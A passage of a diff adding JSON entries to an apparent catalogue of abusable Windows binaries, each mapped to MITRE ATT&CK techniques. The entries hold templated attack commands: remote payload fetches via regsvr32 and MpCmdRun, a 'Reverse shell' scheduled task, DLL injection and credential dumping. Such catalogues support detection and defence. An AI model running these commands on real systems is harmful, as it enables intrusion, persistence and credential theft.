+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe"
+ },
+ "IntelliTrace.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Visual Studio command-line tool for collecting and managing diagnostic trace files.",
+  "example": "IntelliTrace.exe launch /cp:\"collectionplan.xml\" /f:\"c:\\users\\public\\log\" \"C:\\Windows\\System32\\calc.exe\"",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\IntelliTrace\\IntelliTrace.exe"
+ },
+ "Jsc.exe": {
+  "categories": [
+   "Compile"
+  ],
+  "description": "Binary file used by .NET to compile JavaScript code to .exe or .dll format",
+  "example": "jsc.exe {PATH:.js}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Jsc.exe"
+ },
+ "Launch-VsDevShell.ps1": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet",
+  "example": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1"
+ },
+ "Ldifde.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Creates, modifies, and deletes LDAP directory objects.",
+  "example": "Ldifde -i -f {PATH:.ldf}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "c:\\windows\\system32\\ldifde.exe"
+ },
+ "Logger.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "A logging configuration tool from the Windows Kits used to start and manage process logging.",
+  "example": "logger.exe RUN \"{CMD}\"",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\logger.exe"
+ },
+ "MSAccess.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office component",
+  "example": "MSAccess.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSAccess.exe"
+ },
+ "Makecab.exe": {
+  "categories": [
+   "ADS",
+   "Download",
+   "Execute"
+  ],
+  "description": "Binary to package existing files into a cabinet (.cab) file",
+  "example": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab",
+  "mitre": [
+   "T1036",
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\makecab.exe"
+ },
+ "Manage-bde.wsf": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Script for managing BitLocker",
+  "example": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "C:\\Windows\\System32\\manage-bde.wsf"
+ },
+ "Mavinject.exe": {
+  "categories": [
+   "ADS",
+   "Execute"
+  ],
+  "description": "Used by App-v in Windows",
+  "example": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1218.013",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\mavinject.exe"
+ },
+ "Mftrace.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Trace log generation tool for Media Foundation Tools.",
+  "example": "Mftrace.exe {PATH:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x86\\mftrace.exe"
+ },
+ "Microsoft.NodejsTools.PressAnyKey.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Part of the NodeJS Visual Studio tools.",
+  "example": "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\Extensions\\Microsoft\\NodeJsTools\\NodeJsTools\\Microsoft.NodejsTools.PressAnyKey.exe"
+ },
+ "Microsoft.Workflow.Compiler.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
+  "example": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe"
+ },
+ "Mmc.exe": {
+  "categories": [
+   "Download",
+   "Execute",
+   "UAC Bypass"
+  ],
+  "description": "Load snap-ins to locally and remotely manage Windows systems",
+  "example": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}",
+  "mitre": [
+   "T1218.014"
+  ],
+  "path": "C:\\Windows\\System32\\mmc.exe"
+ },
+ "Mofcomp.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Compiler that parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. Threat actors can leverage this binary to install malicious MOF scripts",
+  "example": "mofcomp.exe {PATH_ABSOLUTE:.mof}",
+  "mitre": [
+   "T1047"
+  ],
+  "path": "C:\\Windows\\System32\\wbem\\mofcomp.exe"
+ },
+ "MpCmdRun.exe": {
+  "categories": [
+   "ADS",
+   "Download"
+  ],
+  "description": "Binary part of Windows Defender. Used to manage settings in Windows Defender",
+  "example": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.4-0\\MpCmdRun.exe"
+ },
+ "Mpiexec.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Command-line tool for running Message Passing Interface (MPI) applications.",
+  "example": "mpiexec.exe {CMD}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft MPI\\Bin\\mpiexec.exe"
+ },
+ "Msbuild.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Used to compile and execute code",
+  "example": "msbuild.exe {PATH:.xml}",
+  "mitre": [
+   "T1036",
+   "T1127.001"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Msbuild.exe"
+ },
+ "Msconfig.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",
+  "example": "Msconfig.exe -5",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\msconfig.exe"
+ },
+ "Mscopilot.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Microsoft Copilot app",
+  "example": "mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=\"{CMD} && taskkill /f /im mscopilot.exe &&\"",
+  "mitre": [
+   "T1218.015"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft\\Copilot\\Application\\mscopilot.exe"
+ },
+ "Mscopilot_proxy.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Microsoft Copilot proxy launcher",
+  "example": "mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=\"cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&\"",
+  "mitre": [
+   "T1218.015"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft\\Copilot\\Application\\mscopilot_proxy.exe"
+ },
+ "Msdeploy.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Copy",
+   "Execute"
+  ],
+  "description": "Microsoft tool used to deploy Web Applications.",
+  "example": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"",
+  "mitre": [
+   "T1105",
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe"
+ },
+ "Msdt.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Microsoft diagnostics tool",
+  "example": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE",
+  "mitre": [
+   "T1202",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\Msdt.exe"
+ },
+ "Msedge.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Microsoft Edge browser",
+  "example": "msedge.exe {REMOTEURL:.exe.txt}",
+  "mitre": [
+   "T1105",
+   "T1218.015"
+  ],
+  "path": "c:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
+ },
+ "Mshta.exe": {
+  "categories": [
+   "ADS",
+   "Download",
+   "Execute"
+  ],
+  "description": "Used by Windows to execute html applications. (.hta)",
+  "example": "mshta.exe {PATH:.hta}",
+  "mitre": [
+   "T1105",
+   "T1218.005"
+  ],
+  "path": "C:\\Windows\\System32\\mshta.exe"
+ },
+ "Mshtml.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Microsoft HTML Viewer",
+  "example": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\mshtml.dll"
+ },
+ "Msiexec.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used by Windows to execute msi files",
+  "example": "msiexec /quiet /i {PATH:.msi}",
+  "mitre": [
+   "T1218.007"
+  ],
+  "path": "C:\\Windows\\System32\\msiexec.exe"
+ },
+ "MsoHtmEd.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office component",
+  "example": "MsoHtmEd.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSOHTMED.exe"
+ },
+ "Mspub.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Publisher",
+  "example": "mspub.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSPUB.exe"
+ },
+ "Netsh.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Netsh is a Windows tool used to manipulate network interface settings.",
+  "example": "netsh.exe add helper {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1546.007"
+  ],
+  "path": "C:\\WINDOWS\\System32\\Netsh.exe"
+ },
+ "Ngen.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Native Image Generator.",
+  "example": "ngen.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ngen.exe"
+ },
+ "Nmcap.exe": {
+  "categories": [
+   "Reconnaissance"
+  ],
+  "description": "Command-line packet capture utility from Microsoft Network Monitor 3.x.",
+  "example": "nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}",
+  "mitre": [
+   "T1040"
+  ],
+  "path": "C:\\Program Files\\Microsoft Network Monitor 3\\nmcap.exe"
+ },
+ "Ntsd.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Symbolic Debugger for Windows.",
+  "example": "ntsd.exe -g {CMD}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\ntsd.exe"
+ },
+ "Odbcconf.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used in Windows for managing ODBC connections",
+  "example": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}",
+  "mitre": [
+   "T1218.008"
+  ],
+  "path": "C:\\Windows\\System32\\odbcconf.exe"
+ },
+ "OfflineScannerShell.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Defender Offline Shell",
+  "example": "OfflineScannerShell",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\Windows Defender\\Offline\\OfflineScannerShell.exe"
+ },
+ "OneDriveStandaloneUpdater.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "OneDrive Standalone Updater",
+  "example": "OneDriveStandaloneUpdater",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe"
+ },
+ "OpenConsole.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Console Window host for Windows Terminal",
+  "example": "OpenConsole.exe {PATH:.exe}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os64\\OpenConsole.exe"
+ },
+ "Outlook.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office component",
+  "example": "Outlook.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Outlook.exe"
+ },
+ "Pcalua.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Program Compatibility Assistant",
+  "example": "pcalua.exe -a {PATH:.exe}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Windows\\System32\\pcalua.exe"
+ },
+ "Pcwrun.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Program Compatibility Wizard",
+  "example": "Pcwrun.exe {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1202",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\pcwrun.exe"
+ },
+ "Pcwutl.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Microsoft HTML Viewer",
+  "example": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\pcwutl.dll"
+ },
+ "Pester.bat": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used as part of the Powershell pester",
+  "example": "Pester.bat [/help|?|-?|/?] \"$null; {CMD}\"",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "c:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\<VERSION>\\bin\\Pester.bat"
+ },
+ "PhotoViewer.dll": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Windows Photo Viewer",
+  "example": "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll"
+ },
+ "Pixtool.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Command line utility for taking and analyzing PIX GPU captures.",
+  "example": "pixtool.exe launch {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft PIX\\pixtool.exe"
+ },
+ "Pktmon.exe": {
+  "categories": [
+   "Reconnaissance"
+  ],
+  "description": "Capture Network Packets on the windows 10 with October 2018 Update or later.",
+  "example": "pktmon.exe start --etw",
+  "mitre": [
+   "T1040"
+  ],
+  "path": "c:\\windows\\system32\\pktmon.exe"
+ },
+ "Pnputil.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used for installing drivers",
+  "example": "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}",
+  "mitre": [
+   "T1547"
+  ],
+  "path": "C:\\Windows\\system32\\pnputil.exe"
+ },
+ "Powerpnt.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office binary.",
+  "example": "Powerpnt.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Powerpnt.exe"
+ },
+ "Powershell.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Powershell.exe is a a task-based command-line shell built on .NET.",
+  "example": "powershell.exe -ep bypass -file c:\\path\\to\\a\\script.ps1",
+  "mitre": [
+   "T1059.001"
+  ],
+  "path": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
+ },
+ "Presentationhost.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "File is used for executing Browser applications",
+  "example": "Presentationhost.exe {PATH_ABSOLUTE:.xbap}",
+  "mitre": [
+   "T1105",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\Presentationhost.exe"
+ },
+ "Print.exe": {
+  "categories": [
+   "ADS",
+   "Copy"
+  ],
+  "description": "Used by Windows to send files to the printer",
+  "example": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\print.exe"
+ },
+ "PrintBrm.exe": {
+  "categories": [
+   "ADS",
+   "Download"
+  ],
+  "description": "Printer Migration Command-Line Tool",
+  "example": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}",
+  "mitre": [
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe"
+ },
+ "Procdump.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "SysInternals Memory Dump Tool",
+  "example": "procdump.exe -md {PATH:.dll} explorer.exe",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "no default"
+ },
+ "ProtocolHandler.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office binary",
+  "example": "ProtocolHandler.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\ProtocolHandler.exe"
+ },
+ "Provlaunch.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Launcher process",
+  "example": "provlaunch.exe LOLBin",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\provlaunch.exe"
+ },
+ "Psr.exe": {
+  "categories": [
+   "Reconnaissance"
+  ],
+  "description": "Windows Problem Steps Recorder, used to record screen and clicks.",
+  "example": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0",
+  "mitre": [
+   "T1113"
+  ],
+  "path": "c:\\windows\\system32\\psr.exe"
+ },
+ "Pubprn.vbs": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Proxy execution with Pubprn.vbs",
+  "example": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}",
+  "mitre": [
+   "T1216.001"
+  ],
+  "path": "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs"
+ },
+ "Query.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Remote Desktop Services MultiUser Query Utility",
+  "example": "query.exe user",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\query.exe"
+ },
+ "Rasautou.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Remote Access Dialer",
+  "example": "rasautou -d {PATH:.dll} -p export_name -a a -e e",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\rasautou.exe"
+ },
+ "Reg.exe": {
+  "categories": [
+   "ADS",
+   "Credentials"
+  ],
+  "description": "Used to manipulate the registry",
+  "example": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg",
+  "mitre": [
+   "T1003.002",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\reg.exe"
+ },
+ "Regasm.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Part of .NET",
+  "example": "regasm.exe {PATH:.dll}",
+  "mitre": [
+   "T1218.009"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe"
+ },
+ "Regedit.exe": {
+  "categories": [
+   "ADS"
+  ],
+  "description": "Used by Windows to manipulate registry",
+  "example": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey",
+  "mitre": [
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\regedit.exe"
+ },
+ "Regini.exe": {
+  "categories": [
+   "ADS"
+  ],
+  "description": "Used to manipulate the registry",
+  "example": "regini.exe {PATH}:hidden.ini",
+  "mitre": [
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\regini.exe"
+ },
+ "Register-cimprovider.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used to register new wmi providers",
+  "example": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\Register-cimprovider.exe"
+ },
+ "Regsvcs.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
+  "example": "regsvcs.exe {PATH:.dll}",
+  "mitre": [
+   "T1218.009"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\RegSvcs.exe"
+ },
+ "Regsvr32.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Used by Windows to register dlls",
+  "example": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll",
+  "mitre": [
+   "T1218.010"
+  ],
+  "path": "C:\\Windows\\System32\\regsvr32.exe"
+ },
+ "Remote.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Debugging tool included with Windows Debugging Tools",
+  "example": "Remote.exe /s {PATH:.exe} anythinghere",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\remote.exe"
+ },
+ "Replace.exe": {
+  "categories": [
+   "Copy",
+   "Download"
+  ],
+  "description": "Used to replace file with another file",
+  "example": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Windows\\System32\\replace.exe"
+ },
+ "Reset.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Remote Desktop Services Reset Utility",
+  "example": "reset.exe session",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\reset.exe"
+ },
+ "Rpcping.exe": {
+  "categories": [
+   "Credentials"
+  ],
+  "description": "Used to verify rpc connection",
+  "example": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM",
+  "mitre": [
+   "T1003",
+   "T1187"
+  ],
+  "path": "C:\\Windows\\System32\\rpcping.exe"
+ },
+ "Rundll32.exe": {
+  "categories": [
+   "ADS",
+   "Execute"
+  ],
+  "description": "Used by Windows to execute dll files",
+  "example": "rundll32.exe {PATH},EntryPoint",
+  "mitre": [
+   "T1218.011",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\rundll32.exe"
+ },
+ "Runexehelper.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Launcher process",
+  "example": "runexehelper.exe {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\runexehelper.exe"
+ },
+ "Runonce.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Executes a Run Once Task that has been configured in the registry",
+  "example": "Runonce.exe /AlternateShellStartup",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\runonce.exe"
+ },
+ "Runscripthelper.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Execute target PowerShell script",
+  "example": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\\Runscripthelper.exe"
+ },
+ "SQLToolsPS.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.",
+  "example": "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe"
+ },
+ "Sc.exe": {
+  "categories": [
+   "ADS"
+  ],
+  "description": "Used by Windows to manage services",
+  "example": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice",
+  "mitre": [
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\sc.exe"
+ },
+ "Schtasks.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Schedule periodic tasks",
+  "example": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"",
+  "mitre": [
+   "T1053.005"
+  ],
+  "path": "c:\\windows\\system32\\schtasks.exe"
+ },
+ "Scriptrunner.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Execute binary through proxy binary to evade defensive counter measures",
+  "example": "Scriptrunner.exe -appvscript {PATH:.exe}",
+  "mitre": [
+   "T1202",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\scriptrunner.exe"
+ },
+ "Scrobj.dll": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Windows Script Component Runtime",
+  "example": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "c:\\windows\\system32\\scrobj.dll"
+ },
+ "Setres.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Configures display settings",
+  "example": "setres.exe -w 800 -h 600",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\setres.exe"
+ },
+ "SettingSyncHost.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Host Process for Setting Synchronization",
+  "example": "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\SettingSyncHost.exe"
+ },
+ "Setupapi.dll": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Windows Setup Application Programming Interface",
+  "example": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\setupapi.dll"
+ },
+ "Sftp.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.",
+  "example": "sftp -o ProxyCommand=\"{CMD}\" .",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Windows\\System32\\OpenSSH\\sftp.exe"
+ },
+ "Shdocvw.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Shell Doc Object and Control Library.",
+  "example": "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\shdocvw.dll"
+ },
+ "Shell32.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Shell Common Dll",
+  "example": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\shell32.dll"
+ },
+ "Shimgvw.dll": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Photo Gallery Viewer",
+  "example": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "c:\\windows\\system32\\shimgvw.dll"
+ },
+ "Sigverif.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "File Signature Verification utility to verify digital signatures of files",
+  "example": "sigverif.exe",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\sigverif.exe"
+ },
+ "Sqldumper.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Debugging utility included with Microsoft SQL.",
+  "example": "sqldumper.exe 464 0 0x0110",
+  "mitre": [
+   "T1003",
+   "T1003.001"
+  ],
+  "path": "C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\SQLDumper.exe"
+ },
+ "Sqlps.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",
+  "example": "Sqlps.exe -noprofile",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\sqlps.exe"
+ },
+ "Squirrel.exe": {
+  "categories": [
+   "AWL Bypass",
